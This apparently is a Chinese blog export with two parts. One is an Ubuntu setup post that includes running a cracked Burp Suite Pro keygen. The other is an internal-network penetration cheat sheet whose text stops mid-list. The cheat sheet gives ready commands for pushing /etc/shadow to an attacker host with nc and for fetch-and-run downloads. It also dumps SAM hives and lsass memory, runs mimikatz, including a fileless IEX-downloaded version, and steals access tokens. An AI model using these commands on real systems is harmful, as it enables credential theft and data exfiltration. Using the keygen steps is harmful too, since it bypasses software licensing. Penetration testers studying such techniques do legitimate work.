title=\"问题描述：\"></a>问题描述：</h3><p>有的时候想要笔记本合上盖子也能继续工作,但是没有设置过的笔记本合上盖后工作环境就停下来了。这就需要进行相关配置。</p>\n<h3 id=\"解决方案-1\"><a href=\"#解决方案-1\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h3><p><code>/etc/systemd/logind.conf</code>:登录管理配置文件</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/systemd/logind.conf</span><br><span class=\"line\"><span class=\"comment\">#修改处</span></span><br><span class=\"line\">HandleLidSwitch=ignore</span><br></pre></td></tr></table></figure>\n\n<p>保存并退出,还需要重启服务生效。</p>\n<p><code>sudo restart systemd-logind</code></p>\n<p>下面是登录管理配置文件的一些细节</p>\n<p>HandlePowerKey=, HandleSuspendKey=, HandleHibernateKey=, HandleLidSwitch=, HandleLidSwitchDocked=</p>\n<p>当 power(电源)/sleep(休眠)/lid(合上盖子) 事件发生时， 应该执行何种操作： </p>\n<p>“ignore”(无操作), “poweroff”(关闭系统并切断电源), “reboot”(重新启动), “halt”(关闭系统但不切断电源), “kexec”(调用内核”kexec”函数), “suspend”(休眠到内存), “hibernate”(休眠到硬盘), “hybrid-sleep”(同时休眠到内存与硬盘), “lock”(锁屏) 。 </p>\n<p>注意， 只监视带有 “power-switch” 标签的 输入设备的 key(按下按钮)/lid(合上盖子) 事件。 如果主机插入了一个扩展坞(docking station) 或者连接了多个显示器， 那么”合上盖子”将执行 HandleLidSwitchDocked= 动作， 否则将执行 HandleLidSwitch= 动作。 </p>\n<p>下面是各选项的默认值： </p>\n<p>HandlePowerKey=poweroff 、 HandleSuspendKey=suspend 、 HandleLidSwitch=suspend 、 </p>\n<p>HandleLidSwitchDocked=ignore 、 HandleHibernateKey=hibernate</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"ubuntn踩坑手册\"><a href=\"#ubuntn踩坑手册\" class=\"headerlink\" title=\"ubuntn踩坑手册\"></a>ubuntn踩坑手册</h1><hr>\n<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ol>\n<li><a href=\"#001\">安装主题后Ctrl+Alt+T 终端快捷方式无效</a></li>\n<li><a href=\"#002\">安装burpsuite</a></li>\n<li><a href=\"#003\">安装有道词典</a></li>\n<li><a href=\"#004\">截图工具 Shutter</a></li>\n<li><a href=\"#005\">安装DeepinScrot</a></li>\n<li><a href=\"#006\">Ubuntu18.04双击网易云音乐无法启动</a></li>\n<li><a href=\"#007\">Ubuntu18.04设置合上盖子时不进入休眠</a></li>\n</ol>\n<p><span id=\"001\"></span></p>\n<h2 id=\"安装主题后Ctrl-Alt-T-终端快捷方式无效\"><a href=\"#安装主题后Ctrl-Alt-T-终端快捷方式无效\" class=\"headerlink\" title=\"安装主题后Ctrl+Alt+T 终端快捷方式无效\"></a>安装主题后Ctrl+Alt+T 终端快捷方式无效</h2><p>解决方案:手动添加快捷方式。</p>\n<p><span id=\"002\"></span></p>\n<h2 id=\"Ubuntu中安装burpsuite\"><a href=\"#Ubuntu中安装burpsuite\" class=\"headerlink\" title=\"Ubuntu中安装burpsuite\"></a>Ubuntu中安装burpsuite</h2><p><a href=\"https://www.jianshu.com/p/3e7bb41a1464\" target=\"_blank\" rel=\"noopener\">参考文章(鸣谢)：一纸笔墨-Ubuntu中安装burp suite</a></p>\n<h3 id=\"安装java环境\"><a href=\"#安装java环境\" class=\"headerlink\" title=\"安装java环境\"></a>安装java环境</h3><p>java 8 下载地址：</p>\n<p><a href=\"https://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html\" target=\"_blank\" rel=\"noopener\">https://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html</a></p>\n<p>选择<code>jdk-8u181-linux-x64.tar.gz</code>(当前最新的64版本,32位下载对应版本)。</p>\n<p>下载完成后,以root用户进入下载目录,将下载到的<code>jdk-8u181-linux-x64.tar.gz</code>解压:<code>tar zxvf jdk-8u181-linux-x64.tar.gz</code></p>\n<p>将解压的得到的<code>jdk1.8.0_181</code>文件夹复制到/opt目录:<code>mv jdk1.8.0_181 /opt/</code></p>\n<blockquote>\n<p>/opt目录用来安装附加软件包，是用户级的程序目录，可以理解为D:/Software。安装到/opt目录下的程序，它所有的数据、库文件等等都是放在同个目录下面。opt有可选的意思，这里可以用于放置第三方大型软件（或游戏），当你不需要时，直接rm -rf 掉即可。在硬盘容量不够时，也可将/opt单独挂载到其他磁盘上使用。</p>\n</blockquote>\n<p>进入/bin目录(<code>cd /bin</code>)，并在/bin目录下创建java软链接：<code>ln -s /opt/jdk1.8.0_181/bin/java java</code></p>\n<blockquote>\n<p>bin为binary的简写，/bin目录主要放置系统的必备执行文件，例如: cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p>\n</blockquote>\n<p>在/bin目录创建了一个Java的软链接使我们都能使用Java。</p>\n<blockquote>\n<p>ln是linux中又一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接.当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p>\n<p>-s 软链接(符号链接)</p>\n<p>软链接：</p>\n<p>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式</p>\n<p>2.软链接可以 跨文件系统 ，硬链接不可以</p>\n<p>3.软链接可以对一个不存在的文件名进行链接</p>\n<p>4.软链接可以对目录进行链接</p>\n</blockquote>\n<p>进入/etc目录,修改/etc/profile文件，在文件末尾加上四行：</p>\n<p><code>export JAVA_HOME=/opt/jdk1.8.0_112</code>#注意版本</p>\n<p><code>export JRE_HOME=${JAVA_HOME}/jre</code></p>\n<p><code>export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib</code></p>\n<p><code>export PATH={JAVA_HOME}/bin:$PATH</code></p>\n<blockquote>\n<p>/etc/profile文件用于修改环境变量，在这里修改的内容是对所有用户起作用的</p>\n</blockquote>\n<p>最后使用命令<code>source /etc/profile</code>重新执行文件使环境变量生效，之后输入<code>echo $JAVA_HOME</code>，如果出现<code>/opt/jdk1.8.0_181</code>则说明安装应该是成功了。</p>\n<h3 id=\"安装burpsuite\"><a href=\"#安装burpsuite\" class=\"headerlink\" title=\"安装burpsuite\"></a>安装burpsuite</h3><p>从52pojie下载burpsuite,将解压得到的burp-loader-keygen.jar和burpsuite_pro_v1.7.37.jar文件移动到<code>/opt/burpsuite</code>(没有就创建一个)。在该目录下用<code>sudo java -jar burp-loader-keygen.jar</code>来运行注册机,用注册机登录。但是这样不方便,有以下解决方案。</p>\n<blockquote>\n<p><strong>/usr/bin</strong>　是在后期安装的一些软件的运行脚本</p>\n</blockquote>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">cd</span> /<span class=\"meta\">opt</span>/<span class=\"keyword\">burpsuite</span></span><br><span class=\"line\"><span class=\"keyword\">sudo </span>+x <span class=\"keyword\">burp-loader-keygen.jar </span><span class=\"keyword\">burpsuite_pro_v1.7.37.jar </span></span><br><span class=\"line\"><span class=\"symbol\">sudo</span> vim /usr/<span class=\"keyword\">bin/burpsuite</span></span><br><span class=\"line\"><span class=\"keyword\"> </span>   #!/<span class=\"keyword\">bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\"> </span>   java -Xbootclasspath/p:/<span class=\"meta\">opt</span>/<span class=\"keyword\">burpsuite/burp-loader-keygen.jar </span>-jar /<span class=\"meta\">opt</span>/<span class=\"keyword\">burpsuite/burpsuite_pro_v1.7.37.jar</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">sudo </span>chmod +x /usr/<span class=\"keyword\">bin/burpsuite</span></span><br></pre></td></tr></table></figure>\n\n<p>之后就可以直接输入<code>sudo burpsuite</code>就可以运行了。</p>\n<p><span id=\"003\"></span></p>\n<h2 id=\"安装有道词典\"><a href=\"#安装有道词典\" class=\"headerlink\" title=\"安装有道词典\"></a>安装有道词典</h2><p><a href=\"https://github.com/yomun/youdaodict_5.5\" target=\"_blank\" rel=\"noopener\">https://github.com/yomun/youdaodict_5.5</a></p>\n<h3 id=\"有道词典-v1-1-1-支持-PyQt-5-5-或以上\"><a href=\"#有道词典-v1-1-1-支持-PyQt-5-5-或以上\" class=\"headerlink\" title=\"有道词典 v1.1.1 ( 支持 PyQt 5.5 或以上 )\"></a>有道词典 v1.1.1 ( 支持 PyQt 5.5 或以上 )</h3><p>这个有道词典是从 Deepin 15.4.1 (youdao-dict_1.0.8-1_amd64.deb) 取出, 然后重新打包成 Ubuntu 能用的 deb 安装包<br>它支持 Ubuntu 16.10 / Fedora 24 / OpenSUSE 42.2 等开始的 Linux 分发版</p>\n<p><a href=\"http://packages.deepin.com/deepin/pool/main/y/youdao-dict/\" target=\"_blank\" rel=\"noopener\">http://packages.deepin.com/deepin/pool/main/y/youdao-dict/</a></p>\n<ol>\n<li>取得有道词典安装包 (需要3D加速, 假设显卡驱动已安装了)</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"regexp\">//gi</span>thub.com<span class=\"regexp\">/yomun/y</span>oudaodict_5.<span class=\"number\">5</span><span class=\"regexp\">/raw/m</span>aster<span class=\"regexp\">/youdao-dict_1.1.1-0~ubuntu_amd64.deb</span></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>如有 pip3 安装的 PyQt5, 卸载之.. (5.6 开始的版本, 因它缺所需旧模块)</li>\n</ol>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如有显示 PyQt5 (<span class=\"number\">5.10</span>.<span class=\"number\">1</span>), 卸载之..</span><br><span class=\"line\"><span class=\"variable\">$ </span>pip3 list | grep PyQt5</span><br><span class=\"line\"><span class=\"variable\">$ </span>pip3 uninstall pyqt5</span><br><span class=\"line\"></span><br><span class=\"line\">root 户口也一样要</span><br><span class=\"line\"><span class=\"variable\">$ </span>sudo pip3 list | grep PyQt5</span><br><span class=\"line\"><span class=\"variable\">$ </span>sudo pip3 uninstall pyqt5</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>安装依赖软件包</li>\n</ol>\n<ul>\n<li>Ubuntu 16.04 - 18.04 / Debian 9.1 / Linux Mint 18.2 / Zorin OS 12.1</li>\n</ul>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo su</span><br><span class=\"line\">$ apt install <span class=\"keyword\">python3</span></span><br><span class=\"line\"></span><br><span class=\"line\">$ apt install <span class=\"keyword\">python3</span>-dbus <span class=\"keyword\">python3</span>-lxml <span class=\"keyword\">python3</span>-pil <span class=\"keyword\">python3</span>-requests <span class=\"keyword\">python3</span>-xdg <span class=\"keyword\">python3</span>-xlib</span><br><span class=\"line\">$ apt-<span class=\"built_in\">get</span> install -<span class=\"keyword\">f</span> -<span class=\"keyword\">y</span></span><br><span class=\"line\">$ apt install <span class=\"keyword\">python3</span>-pyqt5 <span class=\"keyword\">python3</span>-pyqt5.qtmultimedia <span class=\"keyword\">python3</span>-pyqt5.qtquick <span class=\"keyword\">python3</span>-pyqt5.qtwebkit</span><br><span class=\"line\"></span><br><span class=\"line\">$ apt install gir1.<span class=\"number\">2</span>-appindicator3-<span class=\"number\">0.1</span> qml-module-qtgraphicaleffects qml-module-qtquick-controls</span><br><span class=\"line\">$ apt install libqt5multimedia5-plugins ttf-wqy-microhei</span><br><span class=\"line\">$ apt install tesseract-ocr tesseract-ocr-eng tesseract-ocr-chi-<span class=\"keyword\">sim</span> tesseract-ocr-chi-tra</span><br><span class=\"line\"></span><br><span class=\"line\">$ apt install ubuntu-restricted-extras</span><br><span class=\"line\"></span><br><span class=\"line\">我这里<span class=\"keyword\">python3</span>-lxml没安装上,单独来一次。</span><br><span class=\"line\">$ apt-<span class=\"built_in\">get</span> install <span class=\"keyword\">python3</span>-lxml</span><br><span class=\"line\">$ dpkg -i youdao-dict_1.<span class=\"number\">1.1</span>-<span class=\"number\">0</span>~ubuntu_amd64.<span class=\"keyword\">deb</span></span><br><span class=\"line\">上面的没问题到这步就成功了。</span><br><span class=\"line\">Ubuntu <span class=\"number\">18.04</span> 用 fonts-wqy-microhei 取代了 ttf-wqy-microhei</span><br></pre></td></tr></table></figure>\n\n<p><span id=\"004\"></span></p>\n<h2 id=\"截图工具Shutter\"><a href=\"#截图工具Shutter\" class=\"headerlink\" title=\"截图工具Shutter\"></a>截图工具Shutter</h2><p>ubuntu 安装截图工具 Shutter，并设置快捷键 Ctrl+Alt+A</p>\n<h3 id=\"安装截图工具-Shutter\"><a href=\"#安装截图工具-Shutter\" class=\"headerlink\" title=\"安装截图工具 Shutter\"></a>安装截图工具 Shutter</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-<span class=\"builtin-name\">get</span> install shutter</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置-Shutter-截屏快捷键-ctrl-Alt-A\"><a href=\"#设置-Shutter-截屏快捷键-ctrl-Alt-A\" class=\"headerlink\" title=\"设置 Shutter 截屏快捷键 [ctrl + Alt + A]\"></a>设置 Shutter 截屏快捷键 [ctrl + Alt + A]</h3><ol>\n<li>Ubuntu右上角右键 - 打开系统设置 - 打开键盘 - 点击快捷键 - 自定义快捷键</li>\n<li>点击 + 号， 添加快捷键。 名称随便命名，如 shutter select, 命令 设置为 shutter -s<br>点击应用 - 点击 Disabled - 然后迅速按下 ctrl + alt + a</li>\n</ol>\n<p><span id=\"005\"></span></p>\n<h2 id=\"安装DeepinScrot\"><a href=\"#安装DeepinScrot\" class=\"headerlink\" title=\"安装DeepinScrot\"></a>安装DeepinScrot</h2><p>DeepinScrot : 这是一个在深度(Deepin)操作系统中使用的截图工具。<br>深度操作系统是中国国产的基于Linux的操作系统, 界面还蛮清新的, 由武汉深之度科技有限公司研发。</p>\n<p>DeepinScrot截图工具类似于QQ,适合国人。</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:<span class=\"comment\">//packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb</span></span><br><span class=\"line\">sudo dpkg -<span class=\"selector-tag\">i</span> deepin-scrot_2.<span class=\"number\">0</span>-<span class=\"number\">0</span>deepin_all<span class=\"selector-class\">.deb</span> </span><br><span class=\"line\">sudo apt-get install -f</span><br><span class=\"line\">#重新</span><br><span class=\"line\">sudo dpkg -<span class=\"selector-tag\">i</span> deepin-scrot_2.<span class=\"number\">0</span>-<span class=\"number\">0</span>deepin_all<span class=\"selector-class\">.deb</span> </span><br><span class=\"line\">#安装成功</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用DeepinScrot\"><a href=\"#使用DeepinScrot\" class=\"headerlink\" title=\"使用DeepinScrot\"></a>使用DeepinScrot</h3><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">deepin-scrot</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置DeepinScrot快捷键\"><a href=\"#设置DeepinScrot快捷键\" class=\"headerlink\" title=\"设置DeepinScrot快捷键\"></a>设置DeepinScrot快捷键</h3><p>　 ubuntu 设置-键盘－自定义快捷键<br>　 填写名称，命令(deepin-scrot)，快捷键 </p>\n<p><span id=\"006\"></span></p>\n<h2 id=\"Ubuntu18-04双击网易云音乐无法启动\"><a href=\"#Ubuntu18-04双击网易云音乐无法启动\" class=\"headerlink\" title=\"Ubuntu18.04双击网易云音乐无法启动\"></a>Ubuntu18.04双击网易云音乐无法启动</h2><p>解决方案来自知乎。</p>\n<p>Ubuntu 18.04 装了网易云音乐，难道只能用 sudo 启动吗？ - Fancy的回答 - 知乎<br><a href=\"https://www.zhihu.com/question/277330447/answer/478510195\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/277330447/answer/478510195</a></p>\n<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>只能在命令行下用<code>sudo netease-cloud-music</code>启动网易云音乐,双击网易云音乐无法启动。</p>\n<h3 id=\"问题产生原因\"><a href=\"#问题产生原因\" class=\"headerlink\" title=\"问题产生原因\"></a>问题产生原因</h3><p>双击图标无法启动是因为环境变量 SESSION_MANAGER在捣乱。sudo后该环境变量变为了空。</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#输出为空</span></span><br><span class=\"line\">sudo env<span class=\"string\">|grep SESSION_MANAGER</span></span><br><span class=\"line\"><span class=\"meta\">#有输出 </span></span><br><span class=\"line\">env<span class=\"string\">|grep SESSION_MANAGER</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h3><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># 对应行修改为 Exec=sh -c <span class=\"string\">\"unset SESSION_MANAGER &amp;&amp; netease-cloud-music %U\"</span> </span></span><br><span class=\"line\">sudo vim <span class=\"meta-keyword\">/usr/</span>share<span class=\"meta-keyword\">/applications/</span>netease-cloud-music.desktop</span><br><span class=\"line\"><span class=\"meta\"># 修改Exec=</span></span><br><span class=\"line\">sh -c <span class=\"string\">\"unset SESSION_MANAGER &amp;&amp; netease-cloud-music\"</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/UbuntuPro/006_1.png\" alt=\"006_1\"></p>\n<p>保存并退出后即可双击打开网易云音乐。</p>\n<p><span id=\"007\"></span></p>\n<h2 id=\"Ubuntu18-04设置合上盖子时不进入休眠\"><a href=\"#Ubuntu18-04设置合上盖子时不进入休眠\" class=\"headerlink\" title=\"Ubuntu18.04设置合上盖子时不进入休眠\"></a>Ubuntu18.04设置合上盖子时不进入休眠</h2><h3 id=\"问题描述：\"><a href=\"#问题描述：\" class=\"headerlink\" title=\"问题描述：\"></a>问题描述：</h3><p>有的时候想要笔记本合上盖子也能继续工作,但是没有设置过的笔记本合上盖后工作环境就停下来了。这就需要进行相关配置。</p>\n<h3 id=\"解决方案-1\"><a href=\"#解决方案-1\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h3><p><code>/etc/systemd/logind.conf</code>:登录管理配置文件</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/systemd/logind.conf</span><br><span class=\"line\"><span class=\"comment\">#修改处</span></span><br><span class=\"line\">HandleLidSwitch=ignore</span><br></pre></td></tr></table></figure>\n\n<p>保存并退出,还需要重启服务生效。</p>\n<p><code>sudo restart systemd-logind</code></p>\n<p>下面是登录管理配置文件的一些细节</p>\n<p>HandlePowerKey=, HandleSuspendKey=, HandleHibernateKey=, HandleLidSwitch=, HandleLidSwitchDocked=</p>\n<p>当 power(电源)/sleep(休眠)/lid(合上盖子) 事件发生时， 应该执行何种操作： </p>\n<p>“ignore”(无操作), “poweroff”(关闭系统并切断电源), “reboot”(重新启动), “halt”(关闭系统但不切断电源), “kexec”(调用内核”kexec”函数), “suspend”(休眠到内存), “hibernate”(休眠到硬盘), “hybrid-sleep”(同时休眠到内存与硬盘), “lock”(锁屏) 。 </p>\n<p>注意， 只监视带有 “power-switch” 标签的 输入设备的 key(按下按钮)/lid(合上盖子) 事件。 如果主机插入了一个扩展坞(docking station) 或者连接了多个显示器， 那么”合上盖子”将执行 HandleLidSwitchDocked= 动作， 否则将执行 HandleLidSwitch= 动作。 </p>\n<p>下面是各选项的默认值： </p>\n<p>HandlePowerKey=poweroff 、 HandleSuspendKey=suspend 、 HandleLidSwitch=suspend 、 </p>\n<p>HandleLidSwitchDocked=ignore 、 HandleHibernateKey=hibernate</p>\n"},{"title":"内网渗透-笔记","date":"2018-12-24T01:03:55.000Z","_content":"\n# 内网渗透-笔记\n\n## 内网概念\n\n●内部工作人员才能访问的专用网络\n\n●能够获得的信息和服务是公众无法从互联网获取的\n\n●常见用局域网(LAN)和广域网(WAN)来建立内网\n\n## 进行内网渗透的情况\n\n●突破外网进入内网\n\n●仅面向内网系统系统的渗透测试\n\n●模拟内部员工进行渗透测试\n\n## 内网渗透基本流程\n\n1. 信息收集\n\n2. 获取权限\n\n3. 横向移动\n\n4. 权限维持\n\n5. 清理痕迹\n\n## 域渗透流程\n\n1. 普通域内用户密码\n2. 登录到目标域中\n3. 域管进程\n4. 抓取域管密码\n5. 定位域控\n6. 登录域控导出域内所有hash留存备份\n7. 域控制维持\n8. 后渗透\n\n## 文件传输方法\n\n### Windows\n\n#### FTP\n\n```\nftp -s:1.txt                        //以1.txt中的内容执行ftp命令\n```\n\n#### VBS\n\n```\necho 下载文件程序 >> loader.vbs\ncscript loader.vbs 远程文件位置 保存文件位置\n```\n\n#### powershell\n\n```\npowershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('远程文件位置','保存文件位置')\n```\n\n#### certutil\n\n```\ncertutil.exe -urlcache -split -f 远程文件位置\ncertutil.exe -urlcache -split -f 远程文件位置 delete 删除缓存\n```\n\n### Linux\n\n#### wget和wput\n\n#### nc\n\n```\n攻击端监听端口，并重定向：\nnc -nvv -lp 4455 > shaodw.txt\n目标机将文件内容回传：\nnc 192.168.111.251 4455 < /etc/shadow\n```\n\n#### curl\n\n```\ncurl -O http://192.168.111.1:8080/test/putty.exe\n```\n\n#### scp\n\n#### Rsync\n\n### 环境搭建\n\n#### python快速搭建服务器\n\n| 类型 |                          命令                          |\n| :--: | :----------------------------------------------------: |\n| http |             python -m SimpleHTTPServer 80              |\n| ftp  | python -m pyftpdlib -p 21 (需要安装,默认用户anonymous) |\n\n#### 防火墙对ftp两种模式的影响(尤其是Windows自带的ftp)\n\n#### powershell搭建http\n\nhttps://gallery.technet.microsoft.com/scriptcenter/Powershell-Webserver-74dcf466/file/162511/2/Start-WebServer.ps1\n\n## Windows信息收集\n\n### 系统信息\n\n```powershell\nsysteminfo\n#csv格式\nsysteminfo /fo:csv\n```\n\n### 用户及用户组信息\n\n```powershell\n#查看当前用户及sid\nwhoami /user\n#查看用户组\nwhoami /proups\n#查看用户权限\nwhoami /priv\n\n#查看用户\nnet user\n#查看admin用户详细信息\nnet user \"admin\"\n\n#查看组\nnet localgroup\n#查看administrators组\nnet localgroup \"administrators\"\n\n#查看密码策略\nnet accounts\n```\n\n### 登录信息\n\n```powershell\nquery user\n#查看在线用户，登陆时间，登录类型\n```\n\n### 网络信息\n\n```powershell\nipconfig\nipconfig /all\nipconfig /displaydns\n\nroute\n#查看路由信息\nroute print -4 \n\n#显示arp缓存\narp -a\n\nnetstat\n#显示活动的tcp,udp及对应pid\nnetstat -ano\n#显示tcp连接\nnetstat -p tcp\n\n#查看共享信息\nnet share \n#查看c$共享信息\nnet share c$\n\n#检索网络连接列表\nnet use\n```\n\n### 敏感文件\n\n```powershell\n1.cmdkey /list\n2.Hosts文件 （C:\\Windows\\System32\\drivers\\etc\\hosts）\n3.回收站(cmd)\ncd C:\\$RECYCLE.BIN\n#dir /ah （查看文件夹，包括隐藏文件）\n```\n\n### IIS信息收集\n\n```powershell\nIIS6 - adminscripts\nIIS7之后 - appcmd\n路径：%systemroot%\\system32\\inetsrv\n\n#有权限条件下可执行\n\n#列出网站列表\n%systemroot%/system32/inetsrv/appcmd.exe list site\n#列出物理路径\n%systemroot%/system32/inetsrv/appcmd.exe list vdir\n```\n\n### 凭证收集\n\n思路：Windows hash、浏览器密码、cookie、远程桌面密码、VPN密码、WLAN密码、IIS服务器密码、FTP服务器密码等。\n\n#### Windows Hash\n\nNTLM hash 和 LM Hash\n\nhash在内存中可被抓取\n\n#### 离线凭证收集\n\n##### reg命令保存注册表键\n\n```powershell\n#注意UAC\nreg save hklm\\sam c:\\sam.hive\nreg save hklm\\system c:\\system.hive\n```\n\n##### 使用Invoke-NinjaCopy\n\n```powershell\npowershell -exec bypass\nImport-Module .\\invoke-ninjacopy.ps1\n# -Path SAM/SYSTEM了路径  -LocalDestination 保存位置\nInvoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination c：\\sam.hive \nInvoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination c：\\system.hive\n```\n\n利用上述手段将两个文件保存到本地，再用saminside或cain导入\n\n```powershell\n#### Saminside\n\nexe程序，需要拿到sam和system文件\n\n#### Cain\n\n类似Saminside。\n```\n\n---\n\n\n\n##### 离线提取lsass进程\n\n任务管理器找到lsass进程后右键转储文件。（不同版本Windows进程名可能不同）\n\n##### procdump.exe\n\n```powershell\n#cmd下\nprocdump.exe -ma lsass.exe lsass.dmp\n```\n再用mimikatz提取密码(管理员)  （有Powershell版Mimikatz）\n\n```powershell\nsekurlsa::minidump lsass.dmp \nsekurlsa::logonpasswords\n```\n#### 在线凭证收集\n\n##### Mimikatz\n\nhttps://github.com/gentilkiwi/mimikatz\n\n##### Powershell版Mimikatz\n\n```powershell\n# Powershell版\n#写好的Powershell文件\npowershell Import-Module .\\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonPasswords full\"'\n\n#无文件执行\npowershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonPasswords full\"'\n```\n\n### Windows访问令牌\n\n系统使用令牌来控制用户可访问的对象，并控制用户执行相关系统操作。\n\n```\n#两种token\n·Delegation token（授权令牌]：用于交互会话登录（例如本地用户直接登录、远程\n桌面登录）\n·Impersonation token（模拟令牌]：用于非交互登录（利用net use访问共享文件夹）\n```\n\n注：\n\n两种token只在系统重启后清除\n\n具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效\n\n#### 令牌窃取\n\n##### mimikatz\n\n```powershell\n#管理员运行mimikatz\n#获取debug权限\nprivilege::debug\n#模仿system用户的令牌\ntoken::elevate\n#列出令牌\ntoken::list\n#获取sam数据库中的密码\nlsadump::sam\n#恢复令牌\ntoken::revert\n```\n\n\n\n##### Invoke-TokenManipulation.ps1\n\n https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1\n\n##### meterpreter中incognito\n\n## Linux下信息收集\n\n### 查看系统类型\n\n```python\ncat /etc/issue\ncat /etc/*-release\ncat /etc/lsb-release\ncat /etc/redhat-release (红帽子)\n```\n\n### 内核版本\n\n```\ncat /proc/version\nuname -a\nuname -mrs\nrpm -q kernel\ndmesg | grep linux\nls /boot | grep vmlinux\n```\n\n### 进程与服务\n\n```\nps aux\nps -ef\ntop\ncat /etc/services\n```\n\n### 安装的应用程序\n\n```\ndpkg -l\nrpm -qa\n```\n\n### 基本信息收集\n\n```\ncat /etc/syslog.conf \ncat /etc/chttp.conf \ncat /etc/lighttpd.conf \ncat /etc/cups/cupsd.conf \ncat /etc/inetd.conf \ncat /etc/apache2/apache2.conf \ncat /etc/my.conf \ncat /etc/httpd/conf/httpd.conf \ncat /opt/lampp/etc/httpd.conf\n```\n\n### 计划任务\n\n```\ncrontab -l\n1s -alh /var/spool/cron\n1s -al /etc/ | grep cron\n1s -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow \ncat /etc/at.deny\ncat /etc/cron.allow \ncat /etc/cron.deny \ncat /etc/crontab \ncat /etc/anacrontab \ncat 